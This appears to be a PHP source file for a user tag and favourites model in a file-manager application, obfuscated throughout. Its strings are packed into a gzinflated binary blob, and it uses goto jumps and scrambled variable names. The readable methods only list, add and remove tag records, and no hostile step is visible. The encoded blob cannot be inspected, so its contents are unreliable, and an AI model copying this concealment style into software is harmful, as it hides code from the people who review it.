\312\24\115\352\156\103\174\50\205\27\45\144\275\144\16\104\350\14\351\303\362\327\241\234\320\321\161\24\54\115\25\346\102\244\372\342\335\120\14\23\247\225\33\76"."\x41\x86\xce\xea\xb2\x39\x12\xe\x54\x22\x89\xfa\xe5\xe2\x2\x38\xd2\x15\x1c\x4b\x28\x9\xc9\x1c\x3a\x14\xce\x4f\x12\x9f\x74\x1a\x3f\xe1\xc5\xf8\x9a\xa1\x32\x44\x7b\xd0\xeb\x48\x75\x71\x11\x30\xeb\x8e\xd1\x9e\xae".base64_decode('LGBmSc2X5XlJIKBnwlJzshjBhBVi5T8ioNI5xZLVGJHBqBvTMfnS8cYHBiWjcqajO2VAg10=')."\x47\x1c\x32\x23\x25\x99\x66\x26\x83\x1f\x86\x27\xc8\xa6\x62\xc5\xd2\x61\x5c\x5a\x42\x70\x6a\x69\x87\xc8\xed\x5b\x6c\x1c\x9a\x98\x25\xcf\x1c\x34\x2f\xe0\xcc\xa2\xe5\x75\xd7\xbc\xc9\x15\xdc\x73\x4a\x6b\x38\xdc\x60"."\xca\xe9\xc3\x86\x9d\x48\x4b\xac\x82\xd2\xcc\xd2\xf4\x42\xc9\x32\x43\x7\xca\x8f\xc3\xdd\x5b\xb6\xca\x6e\x6\x8a\x68\xa4\xa4\x3f\x92\x74\x54\xdc\x2c\x53\x87\xf6\xa8\x6c\x35\x9a\x85\x6b\x8a\xab\x98\xa3\xee\x4\x53".base64_decode('gOvSLFy3JJtVLplXUs/WitYEwyudPGDIJcsMWLCtpKITzWfZwqWfgz3gLk04eOV7IRhvLuE=')."\224\162\275\50\133\170\302\136\270\113\13\172\10\137\274\313\345\224\335\240\140\6\277\314\211\301\162\312\234\21\24\377\115\50\355\45\44\240\112\17\53\221\127\106\36\213\176\22\123\146\262\255\315"."\62\331\262\160\127\171\361\257\150\131\374\146\71\345\262\134\351\362\4\201\341\170\32\141\362\233\210\74\314\30\203\220\50\351\307\114\165\34\142\305\334\140\316\344\7\143\122\310\72\143\252\56\120".strrev(':¼ÅİÇ2GÙóGø¶@éİ	i½‹ÒˆR‡\\hÊyÊV;˜<uÕeıc%ÏĞNkIsÏp')."\x87\xb8\x50\x19\xe6\x30\x49\xa2\x41\x9f\x78\x77\xa2\xed\x49\x64\x99\x80\x9\x87\x66\x1d\x25\x86\xe0\x91\x8f\xa\xb\x34\xe3\x97\x3c\xfe\x30\x4c\x8c\xd5\x53\xe2\x81\x66\xc7\xcc\x82\xed\xc1\x79\x71\x33\x4f\x7e\x9b"."\x4c\xdb\x16\xb2\x37\x94\x1d\x46\xae\x0\x98\x2\xf0\x48\xa2\x65\x28\x24\x5e\x84\x71\xa7\xc8\xfb\x22\x1\x5b\x82\xb1\x48\x10\xc4\x16\x30\x7b\x29\xa6\xd3\x5c\x82\xe7\x1c\x11\xfc\x6e\xc9\x23\xf2\x1\xf\xaf\x92\xad"."\x45\x97\x80\x85\x48\x18\x34\x93\xfd\xe6\x8\xb3\x73\x89\xe0\x4a\x9a\x24\xf1\x46\xa9\xb9\xa9\xda\x21\xb7\x76\xb7\x2c\x28\x47\xc\xb8\x58\x7e\x9a\xe3\x7\xf7\x53\x5e\xd2\x6\x78\xeb\xf5\xad\xcc\xa7\x1c\xd5\xa9\x5b"."\121\56\356\376\125\55\300\13\206\150\202\372\236\41\354\144\320\374\213\305\143\45\131\135\201\130\254\47\22\155\241\256\152\112\262\111\55\111\2\261\44\253\253\75\322\71\121\136\260\43\20\12\227".base64_decode('5GFhxU5VWEylWaEu0kvyTj9RL0LNi0RP2CNgGLyPilWQHsXyaZO9dbHyMS3D+FPSc4qeFQY=').base64_decode('dEUdJ9tNXm2LWbrmAac3SJeksFOghQE1NItlEDvhS9E8pGL3Phw3OG4Xar7o9gxL5QukGaA=')."\304\216\103\360\106\112\47\133\214\340\54\11\164\145\162\200\274\253\162\206\35\311\256\51\73\277\362\353\114\351\373\40\311\25\363\207\107\162\222\11\242\257\53\315\176\161\347\203\313\40\250\371\303"."\212\110\202\251\64\354\310\266\265\24\343\247\72\304\114\50\233\35\243\24\301\0\377\77\33\263\235\367\317\274\0\0".base64_decode('').base64_decode('')."", 10, -8))); goto d³×Î˜ùÖÌ; d³×Î˜ùÖÌ: define($_SERVER[ÓïÕü][0], $_SERVER[ÓïÕü][1]); $_SERVER[şªÒä] = explode($_SERVER[ÓïÕü][2], gzinflate(substr($_SERVER[ÓïÕü][3], 10, -8))); function binCheckEq($¡¿óæüú, $¬®ğÉÔº) { return $¡¿óæüú == $¬®ğÉÔº; } goto CØÃöã²§ ; E–ÏöîåÄõ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($Ö¹©˜ë©) { $ëµºõƒ‰ =& $_SERVER[ÓïÕü]; return array($ëµºõƒ‰[2122] => array($ëµºõƒ‰[2554] . USER_ID, $ëµºõƒ‰[2123])); } protected function listData() { $öªÄŸ·Œ =& $_SERVER[ÓïÕü]; $óší¤È˜ = array($öªÄŸ·Œ[1797] => USER_ID, $öªÄŸ·Œ[562] => array($öªÄŸ·Œ[2126], 0)); $–Ã–˜ = $öªÄŸ·Œ[2555]; $Œä‘ßùø = $this->field($–Ã–˜)->where($óší¤È˜)->order($öªÄŸ·Œ[2128])->select(); return $Œä‘ßùø ? $Œä‘ßùø : array(); } protected function addToTag($úÎºÌ©ù, $Ó§ÆŒ©Ø) { $ªñÅÆ =& $_SERVER[ÓïÕü]; if (!Model($ªñÅÆ[2276])->listData($Ó§ÆŒ©Ø)) { return !1; } if (is_numeric($úÎºÌ©ù)) { $Ç–«Ï = Model($ªñÅÆ[921])->pathInfo($úÎºÌ©ù); if (!$Ç–«Ï) { return !1; } } else { $Ç–«Ï = IO::infoSimple($úÎºÌ©ù); if (!$Ç–«Ï) { return !1; } $Ö¡Ï¯çè = $Ç–«Ï[$ªñÅÆ[32]]; $ãŒ¦©ßø = $Ç–«Ï[$ªñÅÆ[33]]; if (isset($Ç–«Ï[$ªñÅÆ[488]])) { $ãŒ¦©ßø = $Ç–«Ï[$ªñÅÆ[488]] == $ªñÅÆ[91] ? $ªñÅÆ[78] : $ªñÅÆ[233]; } } $ÅÏ·‡ÕŒ = array($ªñÅÆ[1797] => USER_ID, $ªñÅÆ[562] => $Ó§ÆŒ©Ø, $ªñÅÆ[498] => $úÎºÌ©ù, $ªñÅÆ[499] => $ãŒ¦©ßø ? $ãŒ¦©ßø : $ªñÅÆ[493], $ªñÅÆ[497] => $Ö¡Ï¯çè ? $Ö¡Ï¯çè : $ªñÅÆ[12], $ªñÅÆ[2010] => 0); if ($this->where($ÅÏ·‡ÕŒ)->find()) { return !1; } return $this->add($ÅÏ·‡ÕŒ); } protected function removeFromTag($Ê—ãú“Î, $·—²Öô±) { $Ôù´İì‡ =& $_SERVER[ÓïÕü]; if (!Model($Ôù´İì‡[2276])->listData($·—²Öô±)) { return !1; } if (is_array($Ê—ãú“Î)) { $Ê—ãú“Î = array($Ôù´İì‡[7], $Ê—ãú“Î); } $Ü†ô¼Ë = array($Ôù´İì‡[1797] => USER_ID, $Ôù´İì‡[562] => $·—²Öô±, $Ôù´İì‡[498] => $Ê—ãú“Î); return $this->where($Ü†ô¼Ë)->delete(); } protected function removeByTag($ıŒÕÔÊƒ) { $éëôˆâ =& $_SERVER[ÓïÕü]; if (!$ıŒÕÔÊƒ) { return !1; } $—É ÕÂ‰ = array($éëôˆâ[1797] => USER_ID, $éëôˆâ[562] => $ıŒÕÔÊƒ); return $this->where($—É ÕÂ‰)->delete(); } protected function removeBySource($š²åÓ›) { $¢øÙã‡© =& $_SERVER[ÓïÕü]; if (is_array($š²åÓ›)) { $š²åÓ› = array($¢øÙã‡©[7], $š²åÓ›); } $„ó¥üöÕ = array($¢øÙã‡©[1797] => USER_ID, $¢øÙã‡©[562] => array($¢øÙã‡©[1118], 0), $¢øÙã‡©[498] => $š²åÓ›); return $this->where($„ó¥üöÕ)->delete(); } }